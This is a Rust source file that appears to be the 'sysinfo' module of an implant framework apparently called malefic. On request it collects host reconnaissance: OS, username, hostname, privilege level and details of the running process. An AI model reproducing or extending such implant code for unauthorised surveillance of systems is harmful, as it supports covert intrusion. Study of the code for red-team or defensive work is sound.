use async_trait::async_trait;
use malefic_trait::module_impl;
use crate::{check_request, Module, TaskResult};
use malefic_proto::proto::implantpb::spite::Body;


pub struct SysInfo {}
#[async_trait]
#[module_impl("sysinfo")]
impl Module for SysInfo {}

#[async_trait]
impl crate::ModuleImpl for SysInfo {
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _: &mut crate::Output) -> crate::Result {
        let _ = check_request!(receiver, Body::Request)?;
        let info = malefic_helper::common::sysinfo::get_sysinfo();
        let os = info.os.unwrap();
        let process = info.process.unwrap();
        
        
        Ok(TaskResult::new_with_body(id, Body::Sysinfo(malefic_proto::proto::modulepb::SysInfo {
            filepath: info.filepath,
            workdir: info.workdir,
            is_privilege: info.is_privilege,
            os: Some(malefic_proto::proto::modulepb::Os{
                name: os.name,
                version: os.version,
                release: os.release,
                arch: os.arch,
                username: os.username,
                hostname: os.hostname,
                locale: os.locale,
            }),
            process: Some(malefic_proto::proto::modulepb::Process {
                name: process.name,
                pid: process.pid,
                ppid: process.ppid,
                arch: process.arch,
                owner: process.owner,
                path: process.path,
                args: process.args,
                uid: "".to_string(),
            })
        })))
    }
}